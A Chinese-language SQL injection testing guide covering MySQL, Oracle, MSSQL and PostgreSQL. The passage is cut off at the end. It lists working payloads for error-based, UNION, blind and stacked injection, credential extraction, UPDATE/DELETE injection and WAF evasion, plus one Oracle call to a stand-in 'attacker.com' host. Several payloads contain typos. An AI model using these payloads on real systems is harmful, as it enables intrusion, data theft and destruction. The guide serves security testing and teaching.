# SQL Injection 测试思路与用例

## 基本思路

### 寻找注入点

#### 从HTTP方法来看

可能存在注入的有：
- HTTP GET 请求
  - 例如`GET /?id=homePage HTTP/1.1`中的id位置


- POST 请求的Form data
例如：
```
POST / HTTP/1.1
Host: netspi.com.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

username=harold&email=harold@netspi.com
```

- POST 请求的JSON

例如：
```
POST / HTTP/1.1
Host: netspi.com.com
Content-Type: application/json
Content-Length: 56

{
  "username":"harold",
  "email":"harold@netspi.com"
}
```

- POST 请求的XML

例如：
```
POST / HTTP/1.1
Host: netspi.com.com
Content-Type: application/xml
Content-Length: 79

<root>
  <username>harold</username>
  <email>harold@netspi.com</email>
</root>
```

#### 从页面功能上来看
可以关注一下地方：
- 搜索框
- 注册框
- 登录框
- 排序
- 动态图表
- 日期查询
- 语种选择
- profile查询或显示
##### 搜索框

搜索框可能用到语句有：

```SELECT p.*, pac.all_cities FROM {p}_page AS p left join {p}_page_all_cities pac on p.page_id=pac.page_id and p.lang=pac.lang left join {p}_page_all_provinces pap  on p.page_id=pap.page_id and p.lang=pap.lang WHERE p.[lang] = N'2' AND p.[hidden] = N'0' AND p.[parent_id] =14  And ( p.[title] like N'%sql%' )  And (p.[pri4]=N'1' Or p.[pri5]=N'1' Or p.[pri6]=N'1' Or p.[sec1]=N'1' Or p.[sec2]=N'1' Or p.[sec3]=N'1' Or p.[sec4]=N'1' Or p.[sec5]=N'1' Or p.[sec6]=N'1')  And ( wholeyear=N'1'  Or year1m9=N'1' Or  wholeyear=N'1'  Or year2m1=N'1')  ORDER BY  wholeyear```

上面用到了预编译，有些程序员会毫无安全意识的不使用，使用字符串硬连接，这时就会有注入形成。

> 预编译SQL语句就是将这类语句中的值用“占位符”替代，可以视为将sql语句模板化或者说参数化。一次编译、多次运行，省去了解析优化等过程。DBMS可以将一些常用的预编译语句缓存起来，更好的优化查询。预编译通过 PreparedStatement 和 占位符 实现。使用预编译，SQL注入的参数将不会再进行SQL编译，即 or, and 等关键字不被认为是 SQL语法。上例中“{ }”,就是参数传入位置。


##### 排序功能（get或post排序参数）注入点

排序可能使用了sql的```order by``` 或是 ```sort```,这也是一个常见的可注入点。而且 order by 后语句不能参数化，有利于注入。

`1' order by case when (select sleep(5)) then select null else selct null end;--'`

##### 日期型参数注入点

例如有下列语句：
```SELECT * FROM `wp_posts` where post_content like '%%' and post_date BETWEEN '2020/01/01' and '2020/09/02'```

日期类型如果在接受参数的时候没有进行强制类型转换很容易出现注入问题，也是直接拼接的原因。

##### 语种选择

即出现```lang=cn``` 或 ```language=en```的地方。

##### 其他常见输入处或隐藏输入处

- login
- register
- forgot password
- remember me

##### profile查询或显示
常见于用户个人资料、商品明细、文章细节等等。可能存在 Numerical 或 String型注入。

还需要注意的一点是，这里功能的返回集一般只显示第一个，那么需要灵活使用下列方法控制返回集中结果的排序：
- order by 某个已知的列名 [asc, desc ]
- limit 起始，长度



### 可注入检测
最简单的方法是在可能向服务器传递参数(不局限于有输入框)的位置，在参数后加入一个单引号' 或双引号 "，查看数据库返回情况，若有数据库访问错误类似的反馈，则可能存在sql注入。

事实上，尝试**引发错误或使用永真与永假的boolean逻辑，以观察反馈结果**是检测可注入的最常用方法。

下面举例说明，使用下列进行初步尝试，页面不报错或有不同反馈都可能预示着注入的可能。
#### 逻辑型测试（boolean）
- 先使用 ```page?id=1 or 1=1```、```page?id=1' or '1'='1``` 或 ```1" or "1"="1``` 测试
- 再使用```page?id=1 and 1=2```、```page?id=1' and '1'='2``` 或 ```1" and "1"="2``` 测试
- 比较两种结果
#### 基于数值或算术的测试（可灵活使用加减乘除）
- 先测试`page?id=1/1` 
- 再测试`page?id=1/0`
- 比较结果，两次结果不同说明存在注入。



#### 基于错误的可注入识别
通过触发错误来尝试找到可注入点或获取信息。
##### Mysql
常用方法：
- XML Parser 错误

`SELECT extractvalue(rand(),concat(0x3a,(select version())))`

> 说明：
> ExtractValue() 与UpdateXML()函数是mysql自带的xml操作函数.ExtractValue() 用于从XML字符串中使用XPath语法提取值；UpdateXML()用于返回一个被替代的XML段。
> concat()函数用于连接参数字符串，0x3a表示冒号；
> version()函数是mysql返回数据库版本的函数；
> rand()函数是mysql中返回0-1之间随机数的函数。

例如:
```
mysql> SET @xml = '<a><b>X</b><b>Y</b></a>';
Query OK, 0 rows affected (0.00 sec)

mysql> SET @i =1, @j = 2;
Query OK, 0 rows affected (0.00 sec)

mysql> SELECT @i, ExtractValue(@xml, '//b[$@i]');
```

- Double query

`SELECT 1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT username FROM USERS LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)`

> 说明：
> LIMIT 起始位,记录数
> FLOOR()函数返回实数参数值的下确界
> x紧跟其后，与FLOOR(rand(0)*2)) as x 功能相同，即给出该字段的别名为x；后门的a与其类似。

- Get 当前数据库
`SELECT a()`

>说明，函数a()是不存在的，但mysql若返回错误提示，则会提示`ERROR 1305(42000): FUNCTION 数据库名.a doesnt exist`,这就会暴露数据名。

##### oracle

- 使用无效的 HTTP Request	

`SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual`

> 说明：
> 1.UTL_INADDR是orcale中支持internet寻址的包，包含两个函数：GET_HOST_ADDRESS 和 GET_HOST_NAME ，前者返回服务器IP地址，后者返回主机名。
> 2.V$VERSION 用于显示oracle数据库的版本，它不是一个函数，而是一个schema。有BANNER,BANNER_FULL,BANNER_LEAGACY,CON_ID等列，BANNER返回组件名和版本号。CON_ID为数据所属容器的ID，可能值为0，表示行中数据属于整个CDB;值1，表示行中数据仅属于root；值n表示数据所属的某个特定容器id。
> 3.oracle 中的dual表是一个单行单列的虚拟表。dual表与数据字典一起创建，只有1列：DUMMY 类型为verchar2(1)，只有一个数据'x'。oracle内部逻辑保证dual表永远只有此一条数据。dual主要用来选择系统变量或求一个表达式的值。因为oracle语法要求select语句后必须有from 表名，所以dual表常用于满足语法要求，例如：`select sysdate from daul`.
> 4.rownum是oracle中的伪列名，返回指定行号的数据。第一行就是1，第二行就是2...，例如：`select * from employees where rowunum <10;` 如果后有order by 则顺序以orderby为准。类似的，oracle提供了一个与rownum功能类似的分析函数ROW_NUMBER() .


- CTXSYS.DRITHSX.SN	

`SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual`

> 说明：
> CTXSYS是orcale默认的interMedia管理员用户（安装InterMedia后自动生成），CTXSYS.DRITHSX.SN(user,(sql查询语句))可以完成多种查询。


- Invalid XPath	

`SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual`

> 说明：
> ordsys是一个对象关系数据管理员（oracle默认用户），ordsys.ord_dicom.getmappingxpath函数可以解析xpath
> 令sql查询结果为xpath显然是错误的，但引发的异常有利于注入。


- Invalid XML	

`SELECT to_char(dbms_xmlgen.getxml('select "'||(select user from sys.dual)||'" FROM sys.dual')) FROM dual`

- Invalid XML	

`SELECT rtrim(extract(xmlagg(xmlelement("s", username || ',')),'/s').getstringval(),',') FROM all_users`


##### sql server

- 构造显示转换错误（explicit conversion）

```
SELECT convert(int,(SELECT @@version))
SELECT cast((SELECT @@version) as int)
```

- 构造隐式转换错误（Implicit conversion）

```
SELECT 1/@@version
```

##### mssql cast 函数示例
下面的各查询，可被使用convert函数重写，或重写为一个隐式转换。

- 注入一个CAST函数到当前查询

`SELECT CAST(@@version as int)`

- 显示系统用户

`SELECT CAST(SYSTEM_USER as int);`

- Show all databases in a single line with xml path	

`SELECT CAST((SELECT name,',' FROM master..sysdatabases FOR XML path('')) as int)`

`SELECT CAST((SELECT name AS "data()" FROM master..sysdatabases FOR xml path('')) AS int);`

- Show Server Name	

`SELECT CAST(@@SERVERNAME as int);`

- Show Service Name	

`SELECT CAST(@@SERVICENAME as int);`

- Show List of Databases
- `Note: 下面的语句必须以一行来执行，
```
DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = '';
SELECT @listStr = @listStr + Name + ',' FROM master..sysdatabases;
SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int);
```

- Show List of Tables
  - Note: The query below must be executed in one line.	

```
DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);
SET @listStr = '';SELECT @listStr = @listStr + Name + ',' FROM MYDATABASE..sysobjects WHERE type = 'U';
SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int);
```

- Show List of Columns
  - Note: The query below must be executed in one line.	

```
DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = '';
SELECT @listStr = @listStr + Name + ',' FROM MYDATABASE..syscolumns WHERE id=object_id('MYTABLE');
SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);select cast(@myoutput as int);
```

- Show COLUMN Data
 - Note: The query below must be executed in one line. Replace MYCOLUMN with * to select all columns	DECLARE @listStr VARCHAR(MAX);
```
DECLARE @myoutput VARCHAR(MAX);
SET @listStr = '';
SELECT @listStr = @listStr + MYCOLUMN + ',' FROM MYDATABASE..MYTABLE;
SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1)
SELECT CAST(@myoutput as int);
```

- Show database name one at a time
 - Note: Increment the inner top value to get the next record	SELECT TOP 1 CAST(name as int)

```
FROM sysdatabases
WHERE name in (SELECT TOP 2 name FROM sysdatabases ORDER BY name ASC)
ORDER BY name DESC
```


##### postgresql
示例：
```
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)


,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--


,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name=data_column+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--


,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)

```
#### DBMS 识别
识别DBMS类型是很关键的一步，它决定了后续使用何种查询，查询哪些表，使用哪些内置函数，哪些检测可以绕过等等。下面一些有效的响应可以用于识别DBMS类型。

##### mysql 识别
注意：注释字符 `--` 用于去除后续语句的干扰，减少错误发生。

- SLEEP	函数

`page.php?id=1'-SLEEP(1)=0 LIMIT 1 --`

- BENCHMARK	函数

`page.php?id=1'-BENCHMARK(5000000, ENCODE('Slow Down','by 5 seconds'))=0 LIMIT 1 --`

- String 拼接（concatenation	）

`page.php?id=' 'mysql' --`

- Error messages
  - Note: 通过无效语法触发DB 错误有时能返回包含DBMS名称的错误消息

`page.php?id='`

###### 通用贴士
PHP应用通常使用MYSQL数据库。

###### 下面给出一些完成DBMS版本查询的示例。
假定注入点已知。

- Union	

`product.php?id=' UNION SELECT @@version --`

- Union subquery	
`product.php?id=' UNION (SELECT @@version) --`
- Union null
  - Note: If original query returns more than one column, add null to equal the number of columns	product

`php?id=4 UNION SELECT @@version,null --`

- Stacked Queries
  - Note: Stacked queries do not always return results, so they are best used for injections that update/modify data.	

`product.php?id='; INSERT INTO table_name(some_column_name) VALUES ((SELECT @@version)) --`

##### oracle 识别
注意：注释字符 `--` 用于去除后续语句的干扰，减少错误发生。

- String concatenation:	

`page.jsp?id='||'oracle' --`
- Default table	

`page.jsp?id='UNION SELECT 1 FROM v$version --`

- Error messages
  - Note: Triggering DB errors through invalid syntax will sometimes return verbose error messages that include the DBMS name.	

`page.jsp?id='`

###### General Tips
取决于应用提供的错误，如果有一个 “ORA-XXXX" error ，而每个 X 是整数，那么意味着 database is Oracle。

JSP applications 通常使用 Oracle databases.

###### 下面给出一些完成DBMS版本查询的示例。
假定注入点已知。
使用`SELECT banner FROM v$version` 作为示例查询。

- Union	
`product.jsp?id=' UNION SELECT banner FROM v$version --`

- Union subquery	
`product.jsp?id=' UNION (SELECT banner FROM v$version) --`

- Union null
 - Note: If original query returns more than one column, add null to equal the number of columns-1	

`product.jsp?id=' UNION SELECT banner,null FROM v$version --`
##### ms sql 识别
注意：注释字符 `--` 用于去除后续语句的干扰，减少错误发生。

- WAITFOR Function	
`page.asp?id=';WAITFOR DELAY '00:00:10'; --`

- Default variable	

`page.asp?id=sql'; SELECT @@SERVERNAME --`

- Error messages
 - Note: Triggering DB errors through invalid syntax will sometimes return verbose error messages that include the DBMS name.	

`page.asp?id='`

- Error messages
  - Note: 如果id参数拟接收整数参数值时，@@SERVERNAME 变量值会引发一个 conversion error.	

`page.asp?id=@@SERVERNAME`

- Error messages
  - Note: If the id parameter is an integer, the string value of the @@SERVERNAME variable can cause a conversion error.	

`page.asp?id=0/@@SERVERNAME`

###### General Tips

ASP/ASPX based applications are generally MSSQL.

###### 下面给出一些完成DBMS版本查询的示例。
假定注入点已知。我们使用`SELECT @@version`作为示例查询.

- Union	
`product.asp?id=' UNION SELECT @@version --`

- Union subquery	
`product.asp?id=' UNION (SELECT @@version) --`

- Union null
 - Note: If original query returns more than one column, add null to equal the number of columns	

`product.asp?id=' UNION (SELECT @@version,null) --`

- Stacked query
 - Note: Stacked queries do not always return results, so they are best used for injections that update/modify data.	
`product.asp?id='; SELECT @@version --`


##### 其它
###### 判断数据库名
猜测是否有可用的函数，如：
- database()
- database_name()

例如：猜一下，是不是还有个函数叫database_name(),测试 ```tom' and  SUBSTRING(database_name(),1,1)='a'     ;--``` 查看页面结果或响应状态。

构造一个fuzz：```tom'\+and\+SUBSTRING\(database_name\(\),[0-9],1\)='\w'\+;--```，查看响应中含有“...already exists please try to register with a different username.”，发现数据库名为“HSQLDB” ,是Java内置的数据库。


#### 基于盲注的可注入识别
使用盲注需要事先猜测DBMS类型，以确定可以使用的计时函数。

盲注是种高级注入方法，下面详细讨论部分盲注和全盲注。注意不要使用过高的负载，避免数据库overload。

##### mysql

###### partial-blind
部分盲注是返回HTTP状态码或别的HTML标签响应的查询，它显示了注入查询语句的正确或错误。下面的查询尝试通过断言真或假来利用注入漏洞。真假查询也可以通过返回1或0行来指明；另外，反馈错误往往也是查询结果为0或False的一种情况。

- 版本为 5.x.x
`SELECT substring(version(),1,1)=5`

- 使用子查询
`SELECT 1 AND (select 1)=1`

- 查看 log_table 表是否存在

`SELECT 1 AND (select 1 from log_table limit 0,1)=1`

- Column message exists in table log_table
  - Note: Query should error if column doesn't exist	

`SELECT message FROM log_table LIMIT 0,1`

- First letter of first message is t	

`SELECT ascii(substring((SELECT message from log_table limit 0,1),1,1))=114`


###### 将部分盲注改为全盲注

通过转换,上面的查询语句（PARTIAL_BLIND_QUERY）都可以用于全盲注场景。转换方式：`SELECT IF(*PARTIAL_BLIND_QUERY*，SLEEP(5),null)`

###### 全盲注

部分盲注的结果取决于http响应中的HTTP STATUS codes，响应时间，content-lengths，html contents。这些标签可能指出真或假语句。下面的查询将尝试基于已有猜测信息来断言真假响应。True 可以表示为1或响应无错误，False可以表示为0或响应有错误。

- User is root	
`SELECT IF(user() LIKE 'root@%', SLEEP(5), null)`

- User is root (Benchmark method)	
`SELECT IF(user() LIKE 'root@%', BENCHMARK(5000000, ENCODE('Slow Down','by 5 seconds')), null)`

- Version is 5.x.x	
`SELECT IF(SUBSTRING(version(),1,1)=5,SLEEP(5),null)`


举例：例如有url``` https://my-shop.com?article=4```是可得到200响应的, 其中的article=4可能是一个sql查询条件，那么我们可以构造一个url，进行测试：```https://my-shop.com?article=4 and 1=1```

- 如果两个url产生的浏览器返回结果相同，那么就可以初步确定有盲注漏洞。

- 如果产生了“page not found”响应，那么可能是盲注方法不对，可以尝试```https://my-shop.com?article=4 and 1=2```,这时没任何响应说明存在盲注，因为语句可被接受，且因条件为假未返回结果。

在确定有盲注可能性之后，构造复杂的语句，猜测信息，例如：

- 猜测数据库版本：```https://my-shop.com?article=4 AND substring(database_version(),1,1) = 2``` 

##### oracle

###### partial-blind
部分盲注是返回HTTP状态码或别的HTML标签响应的查询，它显示了注入查询语句的正确或错误。下面的查询尝试通过断言真或假来利用注入漏洞。真假查询也可以通过返回1或0行来指明；另外，反馈错误往往也是查询结果为0或False的一种情况。

- 版本为 12.2
`SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle&12.2%';`

- 子查询可用时
`SELECT 1 FROM dual WHERE 1=(select 1 FROM dual)`

- 查看 log_table 表是否存在

`SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);`

- Column message exists in table log_table
  - Note: Query should error if column doesn't exist	

`Select COUNT(*) from user_tab_cols where column_name = 'MESSAGE' and table_name = 'LOG_TABLE';`

- First letter of first message is t	

`Select message from log_table where rownum=1 and message LIKE 't%';`


###### 将部分盲注改为全盲注

通过转换,上面的查询语句（PARTIAL_BLIND_QUERY）都可以用于全盲注场景。转换方式：`SELECT CASE WHEN (*PARTIAL_BLIND_QUERY*)=1 THEN (SELECT count(*) FROM all_users a, all_users b, all_users c, all_users d) ELSE 0 END FROM dual`

部分盲注查询语句PARTIAL_BLIND_QUERY 必须返回一行，所以总是要尝试对选中的列使用COUNT函数。增加 `"all_users [letter]"` ad naseum 直到数据库响应很慢。You may need to cycle though `[letter]` if the database is caching responses.

###### 全盲注
完全盲查询不会在HTTP/HTML响应中指示查询的任何结果。它们依赖计时函数和别的out-of-band 方法。可执行的查询语句（True statement）将执行X秒后响应，而不可执行的将立即返回。

- version is 12.2
`SELECT CASE WHEN (SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%11.2%')=1 THEN (SELECT count(*) FROM all_users a, all_users b, all_users c, all_users d) ELSE 0 END FROM dual`



##### ms sqlserver

###### partial-blind
部分盲注是返回HTTP状态码或别的HTML标签响应的查询，它显示了注入查询语句的正确或错误。下面的查询尝试通过断言真或假来利用注入漏洞。真假查询也可以通过返回1或0行来指明；另外，反馈错误往往也是查询结果为0或False的一种情况。

- Version is 12.0.2000.8	

`SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'`

- Subselect is enabled	

`SELECT (SELECT @@version)`
- Table log_table exists

`SELECT* FROM log_table`

- Column message exists in table log_table	
`SELECT message from log_table`
- First letter of first message is t	

`WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)`

`SELECT message FROM data WHERE row = 1 and message like 't%'`

###### 将部分盲注改为全盲注

通过转换,上面的查询语句（PARTIAL_BLIND_QUERY）都可以用于全盲注场景。转换方式：`IF exists(*PARTIAL_BLIND_QUERY*) WAITFOR DELAY '00:00:02'`

###### 全盲注
完全盲查询不会在HTTP/HTML响应中指示查询的任何结果。它们依赖计时函数和别的out-of-band 方法。可执行的查询语句（True statement）将执行X秒后响应，而不可执行的将立即返回。

- Version is 12.0.2000.8	

`IF exists(SELECT @@version where @@version like '%12.0.2000.8%') WAITFOR DELAY '00:00:02'`

##### postgresql

###### 部分盲注
```
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```


#### 基于 UNION 注入

UNION注入可以使攻击者扩展原查询的功能，获得更多数据。Union运算符仅用于原查询和新查询具有相同结构的情况（返回字段数量与类型完全一致）。

union语句用来将两个或多个select语句的结果结合起来。即对结果做并操作。

注意，使用union时：
- 各个查询语句的结果中，列的数量必须相同；
- 后续union查询语句各列的数据类型，必须与第一个select语句的各列数据类型相一致。
- 上述要求对所有列有效。

```select first_name from user_system_data union select login_count from user_data;```

union所有的语法也允许重复值。

##### MYSQL
- union
`SELECT "mysql" UNION SELECT @@version` 或`SELECT "mysql" UNION SELECT version()`

- union subquery
`SELECT "mysql" UNION (SELECT @@version)`

- union null
  - 如果原查询返回多于一列，需要在union select后增加足够多的null。

`SELECT "mysql","test" UNION SELECT @@version,null`

- Stacked queries
  - stacked 查询不总是返回结果，所以它们最好用于update或modify注入。

`SELECT "mysql"; INSERT INTO table_name (column_name) VALUES ((SELECT @@version))`

`SELECT "mysql"; UPDATE table_name set column_name=new_value where column_name=some_value`


##### ORACLE
- union
`SELECT user FROM dual UNION SELECT * FROM v$version`

- union subquery
`SELECT user FROM dual UNION (SELECT * FROM v@version)`

- union null
  - 如果原查询返回多于一列，需要在union select后增加足够多的null。

`SELECT user,dummy FROM dual UNION (SELECT banner,null FROM v@version)`

##### SQL SERVER
- union
`SELECT user UNION SELECT @@version`

- union subquery
`SELECT user UNION (SELECT @@version)`

- union null
  - 如果原查询返回多于一列，需要在union select后增加足够多的null。

`SELECT user,system_user UNION (SELECT @@version,null)`

- Union null binary halving
  - 注意这种查询用于检查列的数量，过多的列会返回错误
  - numberOfColumns 为1时会引发错误。

`SELECT * FROM yourtable ORDER BY [numberOfColumns]`

- statcked query
  - 常用于更新、插入、删除等操作。

`SELECT @@version; SELECT @@version --`

#### 其它

- ```" or 1=1 or  version() "``` 
- 然后再使用```" and 1=2 or  version() "``` 
- 
- ```" and ord(mid(version(),1,1))>51)"``` 返回正常（没变化）说明是4.0以上版本，可以用union查询。
- `1 and substring(@@version,1,1)=5` 返回正常，说明是5.x版本。结果居然报“Sorry the solution is not correct, please try again.” 这应该是语句含有不支持的函数VERSION()，那么后台可能不是mysql。


#### joins

join运算用于基于一个关联的列，来连接（组合）两个或多个表。

```select * from user_data INNER JOIN user_data_tan ON user_data.userid=user_data_tan.userid;```





### 猜测用户名

- 判断第一个用户名的首字符是否为字母（ascii('A')=65）？ 
  - `1' and ascii(substring((select concat(username,0x3a,passwd) from users limit 0,1),1,1)) >64`
- 判断第一个用户名的首字符是否为小写字母（ascii('a')=97）？ 
  - `1' and ascii(substring((select concat(username,0x3a,passwd) from users limit 0,1),1,1)) >96`
- 判断第一个用户名的首字符是否为a-m的小写字母（ascii('n')=110）？ 
  - `1' and ascii(substring((select concat(username,0x3a,passwd) from users limit 0,1),1,1)) < 110` 
- ...



## 攻击技术

> 来源：https://sqlwiki.netspi.com/injectionTechniques

### 条件语句

条件语句可以生成复杂的查询，有助于实现盲注。

#### mysql

- IF/ELSE
`SELECT IF(1=2,'true,'false')`

- 逻辑 OR ||

`SELECT 1 || 0` 与 `SELECT 1 OR 0` 相同

- 逻辑 AND &&
```
mysql> SELECT 1 AND 1;
        -> 1
mysql> SELECT 1 AND 0;
        -> 0
```

- 逻辑非 NOT !

```
mysql> SELECT 10 IS TRUE;
-> 1
mysql> SELECT -10 IS TRUE;
-> 1
mysql> SELECT 'string' IS NOT NULL;
-> 1

mysql> SELECT NOT 10;
        -> 0
mysql> SELECT NOT 0;
        -> 1
mysql> SELECT NOT NULL;
        -> NULL
mysql> SELECT ! (1+1);
        -> 0
mysql> SELECT ! 1+1;
        -> 1
```

- 逻辑异或 XOR
```
mysql> SELECT 1 XOR 1;
        -> 0
```
#### oracle
- Case 语句

```
SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual
```

#### ms sql
- CASE
```
SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END
```

- IF/ELSE
```
IF 1=2 SELECT 'TRUE' ELSE SELECT 'FALSE'
```
### 注入位置（Injection Placement）
SQL 注入漏洞总是隐晦的，注入发生位置总是不明显。有些方法可以利用查询的各个部分实现注入。

下列的例子中 `$injection` 标识了注入点。改变数据的注入都是用串联 concatenation，这允许剩下的查询有效。

#### mysql
- 注入位置：`SELECT -> WHERE`

查询示例：`SELECT * FROM USERS WHERE USER='$injection';`  注入字符串为：`' or 1=1 --`

- 注入位置：`UPDATE -> SET`
查询示例：`UPDATE USERS SET email='$injection' WHERE user='NetSPI';`

注入字符串为：`' 'harold@netspi.com' `

- 注入位置：`UPDATE -> WHERE`
  - 试着设置注入字符串到一个有效where值。如果object被更新了，那么注入就成功了。

查询示例：`UPDATE users SET email='harold@netspi.com' WHERE user='$injection';`

注入字符串为：`' 'netspi' '`

- 注入位置：`DELETE -> WHERE`
  - 注意：删除语句要非常小心使用，整张表有可能会被删除。
查询示例：`DELETE FROM USERS WHERE USERS='$injection''`
注入字符串：`' 'harold@netspi.com' '`

#### oracle
- 注入位置：`SELECT -> WHERE`

查询示例：`SELECT user FROM dual WHERE user LIKE '$injection';`  

注入字符串为：`' ||'user%'||'`

- 注入位置：`INSERT -> VALUES`
- 
查询示例：`INSERT INTO log_table(message) VALUES ('$injection');`

注入字符串为：`'||(select user from dual)||'`

- INSERT -> VALUES

查询示例：`INSERT INTO log_table (message) VALUES ('$injection');`

注入字符串：`'||(select user from dual)||'`

- 注入位置：`UPDATE -> SET`

查询示例：`UPDATE log_table SET message='$injection' WHERE message='test';`

注入字符串：`'||(select user from dual)||`

- 注入位置：`UPDATE -> WHERE`
  - 试着设置注入字符串到一个有效where值。如果object被更新了，那么注入就成功了。

查询示例：`UPDATE log_table SET message='test' WHERE message='$injection';`

注入字符串为：`' ||'Injected'||'`

#### ms sql
- 注入位置：SELECT -> WHERE	

查询示例：`SELECT * FROM USERS WHERE "USER"='$injection';`	

注入字符串：`' or 1=1 --`

- 注入位置：UPDATE -> SET	

查询示例：`UPDATE USERS SET "email"='$injection' WHERE "USER"='NetSPI';`

注入：`'+'harold@netspi.com'+'`

- UPDATE -> WHERE
  - Note: 将注入字符串作为一个有效的where值，如果对象更新了，注入就成功了。

示例：`UPDATE USERS SET "email"='harold@netspi.com' WHERE "USER"='$injection';`

注入：`'+'NetSPI'+'`

- DELETE -> WHERE	
`DELETE USERS WHERE "User"='$injection';`	

注入：`'+'NetSPI'+'`

- INSERT -> VALUES	

`INSERT INTO USERS ([User], [Password]) VALUES ('$injection', 'password');`	

注入：`'+(select @@version)+'`

### 注入混淆

混淆查询帮助测试人员绕过WAFs和IDS/IPS，下面有一些基本的查询混淆例子，在应用前可能需要做一些改造。

尝试特殊字符是否可用:

- ```/* */```，行内注释
- ```--```，行注释
- ```#```，行注释
- ```;``` 语句分隔符，可用于构建查询链
- ```'```，单引号，用于包含字符串
- ```+```, 加号用于连接字符串
- ```||```, 用于连接字符串
- ```Char()```， 转化为字符串函数

尝试不同编码:

开发人员常会转义单引号、双引号等特殊字符。但如果数据库采用了宽字符集，可能会有一些字符解析漏洞存在。这是因为web中没有考虑双字节字符的问题，双字节字符可能被web认为是两个字节。

例如：php中的addslashes()函数会转义单引号、双引号、NULL和`\`，或当maigc_quotes_gpc开启时，会在特殊符号前加转义字符“\”

例如：mysql使用GBK编码时，`0xbf27` 和 `0xbf5c`被认为是相同的字符

防护方法：
- 在软件系统各层面统一编码，建议使用utf-8
- html `<meta charset='utf-8'>`，确定设置当前页面字符集。


#### MYSQL

- ASCII > Char	

`SELECT char(65)`
- Char > ASCII 

`SELECT ascii('A')`

- Hex	，即ascii字符的16进制表示

`SELECT 0x4A414B45`

- Hex > Int	
`SELECT 0x20 + 0x40`

- Bitwise AND
`SELECT 6 & 2`

- Bitwise OR	
`SELECT 6`

- Bitwise Negation	
`SELECT ~6`

- Bitwise XOR	
`SELECT 6 ^ 2`

- Right Shift	
`SELECT 6>>2`

- Left Shift	
`SELECT 6<<2`

- Substring	
`SELECT substr('abcd', 3, 2)`

`substr(string, index, length)`

`SELECT substring('abcd', 3, 2)`
- Casting	 强制类型转换
`SELECT cast('1' AS unsigned integer)`

`SELECT cast('123' AS char)`
- Concatenation	
`SELECT concat('net','spi')`

`SELECT 'n' 'et' 'spi'`
- No Quotes	
`SELECT CONCAT(CHAR(74),CHAR(65),CHAR(75),CHAR(69))`

- Block comment	
`SELECT/*block comment(可多行的注释)*/"test"`

结果为 "test"

- Single line comment	
`SELECT 1 -- comments out rest of line`

`SELECT 1 # comments out rest of line`

- No Spaces	
`SELECT(username)FROM(USERS)WHERE(username='netspi')`

测试中发现这里结果列不能设为*。

- Allowed Whitespaces	
常见的空白（不可见字符）有：`09, 0A, 0B, 0C, 0D, A0, 20`

- URL Encode	
`SELECT%20%2A%20FROM%20USERS`
%20 为空格，%2A 为*，%2f为`/`，%3d为=...

可以使用js的encodeURIComponent()尝试转换得到所需。

- Double URL Encode	
`SELECT%2520%2A%2520FROM%2520USERS`

%25是%，%2520即%20,即空格，这个用在有decodeURLComponent的地方。

- Invalid Percent Encode	

`%SEL%ECT * F%R%OM U%S%ERS`

有的过滤机制，会去掉%字符，这里利用了这一点。

更多的参考：https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-WP.pdf

#### oracle
- ASCII > Char	

`SELECT char(65) from dual`

- Char > ASCII	
`SELECT ascii('A') from dual`

- Bitwise AND	
`SELECT 6 & 2 from dual`

- Bitwise OR	
`SELECT 6 from dual`

- Bitwise Negation	
`SELECT ~6 from dual`

- Bitwise XOR	
`SELECT 6 ^ 2 from dual`

- Select Nth Char	
`SELECT substr('abcd', 3, 1) FROM dual; -- Returns 3rd charcter, 'c'`

- Substring	
`SELECT substr('abcd', 3, 2) from dual`

substr(string, index, length)

- Casting	
`select CAST(12 AS CHAR(32)) from dual`

- Concatenation
`SELECT concat('net','spi') from dual`

- Comments	
`SELECT 1 FROM dual -- comment`

- If Statement	
`BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF;`

- Case Statement	
`SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual;` -- Returns 1

`SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual;` -- Returns 2

- Time Delay	

`BEGIN DBMS_LOCK.SLEEP(5); END;` (Requires Privileges)

`SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;`

`SELECT UTL_INADDR.get_host_address('blah.attacker.com') FROM dual;`

`SELECT UTL_HTTP.REQUEST('http://google.com') FROM dual;`

- Select Nth Row	
